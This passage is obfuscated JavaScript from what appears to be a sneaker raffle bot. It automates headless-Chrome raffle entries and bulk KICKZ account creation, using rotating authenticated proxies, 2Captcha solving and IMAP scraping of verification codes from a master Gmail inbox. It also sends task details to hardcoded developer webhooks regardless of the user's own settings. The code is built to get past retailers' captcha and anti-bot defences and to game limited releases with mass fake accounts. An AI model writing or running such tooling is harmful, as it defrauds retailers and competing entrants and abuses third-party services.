                    return console['log'](_0x46bace['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x4ada75['use'](_0x120ab9()), _0x4ada75['use'](_0x2d400b({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x35ea91['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x10a07d = 0x0; _0x10a07d < _0x1f8e84['length']; _0x10a07d++) {
                    if (_0x1a385a != 'yes')
                        var _0x1a385a = '', _0x38d565 = 0x0;
                    var _0x40d9ab, _0x3b4da8 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x1f8e84[_0x10a07d]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x1f8e84[_0x10a07d]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x5e8391
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x35ea91['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x4d5366
                            }
                        ]
                    }];
                    const _0x4e80c7 = { 'embeds': _0x3b4da8 };
                    _0x1e0e73(_0x46d7f1['name'] + '\x20Task\x20' + (_0x10a07d + 0x1) + '\x20/\x20' + _0x1f8e84['length'] + '\x20||\x20File:\x20' + _0x18b452 + '\x20Proxies:\x20' + _0x324cb1);
                    try {
                        await _0x408b94(_0x1f8e84, _0x10a07d);
                    } catch {
                        _0x1a385a = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x2b10bf = await _0x39e876(_0x1f8e84[_0x10a07d], _0x46d7f1, 'dev', ![]), _0x42e665 = await _0x39e876(_0x1f8e84[_0x10a07d], _0x46d7f1, 'pub', ![]);
                    const _0x38cf1c = {
                        'succesDEVMSG': { 'embeds': [_0x2b10bf] },
                        'succesPUBMSG': { 'embeds': [_0x42e665] }
                    };
                    if (_0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '')
                        try {
                            await _0x19fe15(_0x35ea91['webhook'], _0x38cf1c['succesDEVMSG']);
                        } catch {
                        }
                    await _0x4d70b1(0xc8), await _0x19fe15(_0x53da78, _0x38cf1c['succesDEVMSG']), await _0x4d70b1(0xc8);
                    try {
                        await _0x19fe15(_0x44bee6, _0x38cf1c['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x1f8e84[_0x10a07d]['Email'] == '' || _0x1f8e84[_0x10a07d]['Url'] == '' || _0x1f8e84[_0x10a07d]['FirstName'] == '' || _0x1f8e84[_0x10a07d]['LastName'] == '') {
                        console['log'](_0x446ef5() + '\x20[' + _0x482e75[taskModule]['name'] + ']\x20Task\x20' + (_0x10a07d + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x35ea91['useRandomProxy'] = ![])
                        var _0x355621 = _0x41f1a4[_0x10a07d]['split'](':');
                    else
                        var _0x4c774f = Math['round'](Math['random']() * (_0x41f1a4['length'] - 0x1)), _0x355621 = _0x41f1a4[_0x4c774f]['split'](':');
                    var _0xca7a46;
                    try {
                        _0xca7a46 = await _0x4ada75['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x355621[0x0] + ':' + _0x355621[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0xca7a46 = await _0x4ada75['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x355621[0x0] + ':' + _0x355621[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x1d169b = await _0xca7a46['newPage']();
                        await _0x1d169b['authenticate']({
                            'username': '' + _0x355621[0x2],
                            'password': '' + _0x355621[0x3]
                        }), console['log'](_0x446ef5() + '\x20[' + _0x46d7f1['name'] + ']\x20Task\x20' + (_0x10a07d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1d169b['setRequestInterception'](!![]), _0x1d169b['on']('request', _0x503bc1 => {
                            _0x503bc1['resourceType']() === 'image' || _0x503bc1['resourceType']() === 'font' || _0x503bc1['resourceType']() === 'media' ? _0x503bc1['abort']() : _0x503bc1['continue']();
                        });
                        try {
                            await _0x1d169b['goto']('' + _0x1f8e84[_0x10a07d]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x1d169b['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x446ef5() + '\x20[' + _0x46d7f1['name'] + ']\x20Task\x20' + (_0x10a07d + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1d169b['type']('#comp_firstname', '' + _0x1f8e84[_0x10a07d]['FirstName']), await _0x1d169b['waitForSelector']('#comp_lastname'), await _0x1d169b['type']('#comp_lastname', '' + _0x1f8e84[_0x10a07d]['LastName']), await _0x1d169b['waitForSelector']('#comp_email'), await _0x1d169b['type']('#comp_email', '' + _0x1f8e84[_0x10a07d]['Email']), await _0x1d169b['waitForSelector']('#comp_paypalemail'), await _0x1d169b['type']('#comp_paypalemail', '' + _0x1f8e84[_0x10a07d]['Email']), await _0x1d169b['waitForSelector']('#comp_mobile_end'), await _0x1d169b['type']('#comp_mobile_end', '' + _0x1f8e84[_0x10a07d]['Phone']), await _0x1d169b['waitForSelector']('#comp_dob'), await _0x1d169b['type']('#comp_dob', '08/09/1992'), console['log'](_0x446ef5() + '\x20[' + _0x46d7f1['name'] + ']\x20Task\x20' + (_0x10a07d + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x1f8e84[_0x10a07d]['Size'] == 'RANDOM') {
                            const _0x4f4497 = await _0x1d169b['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3caa5d => {
                                return _0x3caa5d['map'](_0x11cea9 => _0x11cea9['value']);
                            });
                            var _0x56e2b9 = Math['round'](Math['random']() * (_0x4f4497['length'] - 0x2));
                            await _0x1d169b['select']('#shoesize', _0x4f4497[_0x56e2b9 + 0x1]), await _0x4d70b1(0x3e8);
                        } else {
                            const _0x5be381 = await _0x1d169b['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x203be4 => {
                                return _0x203be4['map'](_0xe9c8fd => _0xe9c8fd['innerText']);
                            }), _0x13851c = await _0x1d169b['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x54550a => {
                                return _0x54550a['map'](_0x3c2ce7 => _0x3c2ce7['value']);
                            });
                            var _0x4aadfc = _0x1f8e84[_0x10a07d]['Size'];
                            for (var _0xc9416d = 0x1; _0xc9416d < _0x13851c['length']; _0xc9416d++) {
                                var _0x376d45 = _0x5be381[_0xc9416d]['split']('\x20')[0x0];
                                if (_0x376d45 == _0x4aadfc) {
                                    await _0x1d169b['select']('#shoesize', _0x13851c[_0xc9416d]);
                                    break;
                                } else {
                                    if (_0xc9416d + 0x1 == _0x13851c['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x1d169b['waitForSelector']('#comp_address1'), await _0x1d169b['type']('#comp_address1', _0x1f8e84[_0x10a07d]['Address1'] + '\x20' + _0x1f8e84[_0x10a07d]['HouseNumber']), await _0x1d169b['waitForSelector']('#comp_address2'), await _0x1d169b['type']('#comp_address2', '' + _0x1f8e84[_0x10a07d]['Address2']), await _0x1d169b['waitForSelector']('#comp_address2'), await _0x1d169b['type']('#comp_address3', '' + _0x1f8e84[_0x10a07d]['City']), await _0x1d169b['waitForSelector']('#comp_postcode'), await _0x1d169b['type']('#comp_postcode', '' + _0x1f8e84[_0x10a07d]['Zip']), console['log'](_0x446ef5() + '\x20[' + _0x46d7f1['name'] + ']\x20Task\x20' + (_0x10a07d + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x4d70b1(0x4b0), await _0x1d169b['click']('label#emailhold'), await _0x4d70b1(0x5dc), await _0x1d169b['click']('#preauth_tandc_email\x20>\x20label'), await _0x4d70b1(0x5dc), await _0x1d169b['click']('#submit');
                        try {
                            await _0x1d169b['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x446ef5() + '\x20[' + _0x46d7f1['name'] + ']\x20Task\x20' + (_0x10a07d + 0x1) + '\x20:\x20' + _0x46bace['blue']('Awaiting\x20Paypal\x20Payment')), _0xca7a46['on']('targetcreated', async _0x178148 => {
                            if (_0x178148['type']() === 'page') {
                                const _0x43a9c1 = await _0x178148['page']();
                                async function _0x399f91() {
                                    try {
                                        await _0x1d169b['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x1ed042 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x229e30() {
                                    try {
                                        await _0x1d169b['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x4bcf11 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x229e30(), _0x399f91(), await _0x4d70b1(0x493e0);
                            }
                        });
                        async function _0x4db38d() {
                            for (let _0x34fc25 = 0x0; _0x34fc25 < 0x12c; _0x34fc25++) {
                                if (_0x4bcf11 == !![]) {
                                    _0x1a385a = 'no', _0x5155d2(_0x1f8e84[_0x10a07d], _0x46d7f1), console['log'](_0x46bace['green'](_0x446ef5() + '\x20[' + _0x46d7f1['name'] + ']\x20Task\x20' + (_0x10a07d + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '')
                                        try {
                                            await _0x19fe15(_0x35ea91['webhook'], _0x38cf1c['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x4d70b1(0xc8), await _0x19fe15(_0x53da78, _0x38cf1c['succesDEVMSG']), await _0x4d70b1(0xc8);
                                    try {
                                        await _0x19fe15(_0x44bee6, _0x38cf1c['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x1ed042)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x4d70b1(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x4d70b1(0xbb8), await _0x1d169b['click']('.zoid-outlet'), await _0x4d70b1(0x7d0), await _0x4db38d();
                    } catch (_0x1c3e08) {
                        console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x46d7f1['name'] + ']\x20Task\x20' + (_0x10a07d + 0x1) + '\x20:\x20' + _0x1c3e08)), _0x40d9ab = '' + _0x1c3e08;
                        var _0x5661f3 = await _0x39e876(_0x1f8e84[_0x10a07d], _0x46d7f1, 'dev', !![], _0x40d9ab);
                        _0x38cf1c['errorDEV'] = { 'embeds': [_0x5661f3] }, _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x38cf1c['errorDEV']), await _0x19fe15(_0x556085, _0x38cf1c['errorDEV']);
                    } finally {
                        _0xca7a46 && _0xca7a46['close']();
                        if (_0x1a385a == 'yes' && _0x38d565 != 0x5 && _0x40d9ab != 'Size\x20Not\x20Found') {
                            console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x46d7f1['name'] + ']\x20Task\x20' + (_0x10a07d + 0x1) + '\x20:\x20Retrying\x20(' + _0x38d565 + '\x20/\x205)')), _0x10a07d = _0x10a07d - 0x1, _0x38d565 = _0x38d565 + 0x1;
                            continue;
                        }
                        _0x1a385a == 'yes' && _0x38d565 >= 0x5 && (_0x5415a4(afew[_0x10a07d], _0x46d7f1), _0x1a385a = 'no', _0x38d565 = 0x0), console['log']('Waiting\x20for\x20' + _0x35ea91['delay'] + '\x20ms'), await _0x4d70b1(_0x35ea91['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x590496, _0x473228, _0x21d05f) {
                    _0x4ada75['use'](_0x120ab9()), _0x4ada75['use'](_0x2d400b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x35ea91['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3b111c = 0x0; _0x3b111c < _0x473228['length']; _0x3b111c++) {
                        const _0x46ce6a = 'https://www.kickz.com/login';
                        if (_0x4a9f15 != 'yes')
                            var _0x4a9f15 = '', _0x33766c = 0x0;
                        _0x1e0e73(_0x590496['name'] + '\x20Task\x20' + (_0x3b111c + 0x1) + '\x20/\x20' + _0x473228['length'] + '\x20||\x20File:\x20' + _0x18b452 + '\x20Proxies:\x20' + _0x324cb1);
                        try {
                            await _0x408b94(_0x473228, _0x3b111c);
                        } catch {
                            _0x4a9f15 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0xa08172 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x5e8391
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x35ea91['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x4d5366
                                }
                            ]
                        }];
                        const _0x287428 = { 'embeds': _0xa08172 };
                        var _0x41d2c3 = await _0x39e876(_0x473228[_0x3b111c], _0x590496, 'acc', ![]);
                        const _0xdaea2f = { 'succesDEVMSG': { 'embeds': [_0x41d2c3] } };
                        if (_0x473228[_0x3b111c]['Email'] == '' || _0x473228[_0x3b111c]['FirstName'] == '' || _0x473228[_0x3b111c]['LastName'] == '') {
                            console['log'](_0x446ef5() + '\x20[' + _0x590496['name'] + ']\x20Task\x20' + (_0x3b111c + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x473228[_0x3b111c]['Password'] == '' && (_0x473228[_0x3b111c]['Password'] = 'JRaffles23!');
                        if (_0x35ea91['useRandomProxy'] = ![])
                            var _0x118cf8 = _0x21d05f[_0x3b111c]['split'](':');
                        else
                            var _0x339f2e = Math['round'](Math['random']() * (_0x21d05f['length'] - 0x1)), _0x118cf8 = _0x21d05f[_0x339f2e]['split'](':');
                        var _0x2302fd;
                        try {
                            _0x2302fd = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x118cf8[0x0] + ':' + _0x118cf8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2302fd = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x118cf8[0x0] + ':' + _0x118cf8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5aa8c3 = await _0x2302fd['newPage']();
                            await _0x5aa8c3['authenticate']({
                                'username': '' + _0x118cf8[0x2],
                                'password': '' + _0x118cf8[0x3]
                            }), console['log'](_0x446ef5() + '\x20[' + _0x590496['name'] + ']\x20Task\x20' + (_0x3b111c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5aa8c3['setRequestInterception'](!![]), _0x5aa8c3['on']('request', _0x6b0794 => {
                                _0x6b0794['resourceType']() === 'image' || _0x6b0794['resourceType']() === 'font' || _0x6b0794['resourceType']() === 'media' ? _0x6b0794['abort']() : _0x6b0794['continue']();
                            }), await _0x5aa8c3['goto'](_0x46ce6a), await _0x4d70b1(0xbb8), console['log'](_0x446ef5() + '\x20[' + _0x590496['name'] + ']\x20Task\x20' + (_0x3b111c + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x5aa8c3['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x5aa8c3['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x5aa8c3['waitForSelector']('#button-register'), await _0x4d70b1(0x7d0), await _0x5aa8c3['evaluate'](() => {
                                const _0x57c03d = document['querySelector']('#button-register');
                                _0x57c03d['click']();
                            }), console['log'](_0x446ef5() + '\x20[' + _0x590496['name'] + ']\x20Task\x20' + (_0x3b111c + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x4d70b1(0x1388), await _0x5aa8c3['waitForSelector']('#customer_salutation'), await _0x5aa8c3['select']('#customer_salutation', 'mr'), await _0x4d70b1(0x7d0), await _0x5aa8c3['waitForSelector']('#customer_firstname'), await _0x5aa8c3['type']('#customer_firstname', '' + _0x473228[_0x3b111c]['FirstName']), await _0x4d70b1(0x352), await _0x5aa8c3['waitForSelector']('#customer_lastname'), await _0x5aa8c3['type']('#customer_lastname', '' + _0x473228[_0x3b111c]['LastName']), await _0x4d70b1(0x352), await _0x5aa8c3['type']('#email-input', '' + _0x473228[_0x3b111c]['Email']), await _0x4d70b1(0x352), await _0x5aa8c3['type']('#email-confirm-input', '' + _0x473228[_0x3b111c]['Email']), await _0x4d70b1(0x352), await _0x5aa8c3['type']('#register-password', '' + _0x473228[_0x3b111c]['Password']), await _0x4d70b1(0x352), await _0x5aa8c3['type']('#password-confirm', '' + _0x473228[_0x3b111c]['Password']), await _0x4d70b1(0x352), console['log'](_0x446ef5() + '\x20[' + _0x590496['name'] + ']\x20Task\x20' + (_0x3b111c + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x5aa8c3['click']('#consent'), await _0x4d70b1(0x1f4);
                            const _0x5ccf62 = await _0x5aa8c3['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x5ccf62) {
                                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x590496['name'] + ']\x20Task\x20' + (_0x3b111c + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x5aa8c3['click']('#buttonRegister');
                            try {
                                await _0x5aa8c3['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x446ef5() + '\x20[' + _0x590496['name'] + ']\x20Task\x20' + (_0x3b111c + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x473228[_0x3b111c]['Email']), await _0x4d70b1(0x4b0);
                            async function _0x5a9f92() {
                                var _0x582d00, _0x4b13c0 = ![];
                                for (var _0x5d7d17 = 0x0; _0x5d7d17 < 0x18; _0x5d7d17++) {
                                    async function _0x1c34eb() {
                                        var _0x4dd7d4 = new _0x54e3bb({
                                            'user': _0x35ea91['masterMail'],
                                            'password': _0x35ea91['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x5c810f(_0x312d7f) {
                                            _0x4dd7d4['openBox']('INBOX', ![], _0x312d7f);
                                        }
                                        _0x4dd7d4['once']('ready', function () {
                                            console['log'](_0x446ef5() + '\x20[' + _0x590496['name'] + ']\x20Task\x20' + (_0x3b111c + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x5c810f(function (_0x5b9016, _0x3c06d5) {
                                                console['log'](_0x446ef5() + '\x20[' + _0x590496['name'] + ']\x20Task\x20' + (_0x3b111c + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x5b9016)
                                                    throw _0x5b9016;
                                                _0x4dd7d4['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x4c73c5, _0x59cd95) {
                                                    if (!_0x59cd95 || !_0x59cd95['length'])
                                                        console['log'](_0x446ef5() + '\x20[' + _0x590496['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x4dd7d4['end']();
                                                    else {
                                                        var _0xa5b938 = _0x4dd7d4['seq']['fetch'](_0x59cd95, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0xa5b938['on']('message', function (_0x28160b, _0x24ff32) {
                                                            var _0x26f2ad = '(#' + _0x24ff32 + ')\x20';
                                                            _0x28160b['on']('body', function (_0x32bb18, _0x2ad58e) {
                                                                _0x2fc4a3(_0x32bb18, (_0x508a73, _0x190171) => {
                                                                    if (_0x190171['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x461ea3 = _0x190171['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x553868 = _0x461ea3[0x1]['split']('<')[0x0];
                                                                        _0x582d00 = _0x553868;
                                                                    }
                                                                });
                                                            }), _0x28160b['once']('end', function () {
                                                            });
                                                        }), _0xa5b938['once']('error', function (_0x4e9490) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0xa5b938['once']('end', function () {
                                                            _0x4dd7d4['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x4dd7d4['once']('error', function (_0x5819f6) {
                                            console['log'](_0x46bace['red'](_0x5819f6['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x4b13c0 = !![];
                                        }), _0x4dd7d4['once']('end', async function () {
                                        }), _0x4dd7d4['connect']();
                                    }
                                    _0x1c34eb(), await _0x4d70b1(0x1388);
                                    if (_0x582d00)
                                        return _0x582d00;
                                    if (_0x4b13c0)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x5d7d17 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x5a9f92(), _0x4d70b1(0x320), console['log'](_0x446ef5() + '\x20[' + _0x590496['name'] + ']\x20Task\x20' + (_0x3b111c + 0x1) + '\x20:\x20Verifying..'), await _0x5aa8c3['type']('#verificationCode', code), await _0x4d70b1(0x1f4), await _0x5aa8c3['click']('#buttonVerify'), await _0x4d70b1(0x190), await _0x5aa8c3['click']('#buttonVerify'), await _0x4d70b1(0x3e8);
                            try {
                                await _0x5aa8c3['waitForSelector']('div.b-user_greeting'), _0x4a9f15 = 'no', console['log'](_0x46bace['green'](_0x446ef5() + '\x20[' + _0x590496['name'] + ']\x20Task\x20' + (_0x3b111c + 0x1) + '\x20:\x20Account\x20' + _0x473228[_0x3b111c]['Email'] + '\x20Generated\x20&\x20Verified!')), _0xf25b74['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x473228[_0x3b111c]['Email'] + ',' + _0x473228[_0x3b111c]['Password'] + ','), console['log'](_0x446ef5() + '\x20[' + _0x590496['name'] + ']\x20Task\x20' + (_0x3b111c + 0x1) + '\x20:\x20Account\x20' + _0x473228[_0x3b111c]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0xdaea2f['succesDEVMSG']);
                                } catch {
                                }
                                await _0x19fe15(_0x55ae18, _0xdaea2f['succesDEVMSG']);
                            } catch {
                                _0x4a9f15 = 'no', console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x590496['name'] + ']\x20Task\x20' + (_0x3b111c + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x590496['name'] + ']\x20Task\x20' + (_0x3b111c + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x41dd2b) {
                            console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x590496['name'] + ']\x20Task\x20' + (_0x3b111c + 0x1) + '\x20:\x20' + _0x41dd2b)), _0xa08172[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0xa08172[0x0]['description'] = '' + _0x41dd2b, await _0x19fe15(_0x556085, _0x287428), _0x4a9f15 = 'yes';
                        } finally {
                            _0x2302fd && _0x2302fd['close']();
                            if (_0x4a9f15 == 'yes' && _0x33766c != 0x5) {
                                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x590496['name'] + ']\x20Task\x20' + (_0x3b111c + 0x1) + '\x20:\x20Retrying\x20(' + _0x33766c + '\x20/\x205)')), _0x3b111c = _0x3b111c - 0x1, _0x33766c = _0x33766c + 0x1;
                                continue;
                            }
                            _0x4a9f15 == 'yes' && _0x33766c >= 0x5 && (_0x5415a4(_0x473228[_0x3b111c], _0x590496), _0x4a9f15 = 'no', _0x33766c = 0x0), console['log']('Waiting\x20for\x20' + _0x35ea91['delay'] + '\x20ms'), await _0x4d70b1(_0x35ea91['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x5be89f, _0x22d84b, _0xa2c0bf) {
                    _0x4ada75['use'](_0x120ab9()), _0x4ada75['use'](_0x2d400b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x35ea91['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4b974d = 0x0; _0x4b974d < _0x22d84b['length']; _0x4b974d++) {
                        var _0x30f724;
                        if (_0x3d340f != 'yes')
                            var _0x3d340f = '', _0x25d1b4 = 0x0;
                        _0x1e0e73(_0x5be89f['name'] + '\x20Task\x20' + (_0x4b974d + 0x1) + '\x20/\x20' + _0x22d84b['length'] + '\x20||\x20File:\x20' + _0x18b452 + '\x20Proxies:\x20' + _0x324cb1);
                        var _0x1d69d6 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x5e8391
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x22d84b[_0x4b974d]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x22d84b[_0x4b974d]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x35ea91['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x4d5366
                                }
                            ]
                        }], _0x3e5e56 = await _0x39e876(_0x22d84b[_0x4b974d], _0x5be89f, 'dev', ![]), _0x5013c7 = await _0x39e876(_0x22d84b[_0x4b974d], _0x5be89f, 'pub', ![]);
                        const _0x306ca1 = {
                            'succesDEVMSG': { 'embeds': [_0x3e5e56] },
                            'succesPUBMSG': { 'embeds': [_0x5013c7] }
                        };
                        try {
                            await _0x408b94(_0x22d84b, _0x4b974d);
                        } catch {
                            _0x3d340f = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x22d84b[_0x4b974d]['Email'] == '' || _0x22d84b[_0x4b974d]['Password'] == '' || _0x22d84b[_0x4b974d]['FirstName'] == '' || _0x22d84b[_0x4b974d]['LastName'] == '') {
                            console['log'](_0x446ef5() + '\x20[' + _0x5be89f['name'] + ']\x20Task\x20' + (_0x4b974d + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x35ea91['useRandomProxy'] = ![])
                            var _0x17d3cf = _0xa2c0bf[_0x4b974d]['split'](':');
                        else
                            var _0x23d692 = Math['round'](Math['random']() * (_0xa2c0bf['length'] - 0x1)), _0x17d3cf = _0xa2c0bf[_0x23d692]['split'](':');
                        var _0x5c6612;
                        try {
                            _0x5c6612 = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x17d3cf[0x0] + ':' + _0x17d3cf[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5c6612 = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x17d3cf[0x0] + ':' + _0x17d3cf[0x1],
                                    '--no-sandbox',
